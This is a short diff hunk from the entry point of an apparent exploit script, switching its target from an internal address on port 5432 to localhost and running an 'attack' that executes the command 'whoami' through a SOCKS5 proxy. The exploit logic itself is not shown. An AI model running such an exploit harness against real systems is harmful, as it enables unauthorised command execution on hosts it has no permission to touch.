@@ -98,6 +98,6 @@ if __name__ == "__main__":
     os.environ.setdefault('http', 'socks5://127.0.0.1:10810')
     os.environ.setdefault('http', 'socks5://127.0.0.1:10810')
     exp = Exploit()
-    exp.set_option('url', 'http://10.13.10.104:5432')
+    exp.set_option('url', 'http://127.0.0.1:5432')
     exp.set_option('command', 'whoami')
     exp.execute('attack', debug=True)
